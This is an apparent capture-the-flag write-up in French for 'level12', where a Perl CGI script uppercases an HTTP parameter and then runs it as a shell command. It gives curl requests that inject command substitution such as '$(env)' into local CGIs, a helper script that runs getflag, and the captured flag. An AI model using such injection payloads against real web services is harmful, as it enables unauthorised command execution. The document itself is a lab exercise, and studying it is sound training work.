# level12

## Contexte

On trouve un script Perl `level12.pl`.

Le script est utilisé par un serveur web.

## Recherche

En lisant le code, on remarque qu'un paramètre de la requête HTTP est récupéré puis utilisé dans une commande.

Avant d'être exécutée, la chaîne est convertie en majuscules.

## Vulnérabilité

Même si la chaîne est modifiée, il est toujours possible d'injecter une commande grâce à la substitution de commande du shell.

Comme le script est exécuté avec les droits de `flag12`, notre commande le sera également.

## Exploitation

Le script Perl convertit le paramètre en majuscules avant de l'exécuter. En utilisant la substitution de commande du shell, il est possible d'exécuter du code malgré cette conversion.

On peut d'abord inspecter l'environnement via le CGI du niveau précédent (port 4747) :

```bash
curl -s 'http://localhost:4747?x=$(env)'
```

On crée ensuite un script qui exécute `getflag` et on l'injecte via le CGI du niveau 12 (port 4646) :

```bash
echo '#!/bin/bash
getflag > /tmp/level12.flag' > /tmp/level12.sh
chmod +x /tmp/level12.sh
```

On envoie la requête avec le chemin vers notre script :

```bash
curl -s 'http://localhost:4646?x=<chemin_vers_script>'
```

Le script exécute notre commande. On récupère ensuite le résultat :

```bash
cat /tmp/level12.flag
```

Résultat :

```text
g1qKMiRpXf53AWhDaU7FEkczr
```

## Ressources

- Perl
- CGI
- Injection de commande
- Variables d'environnement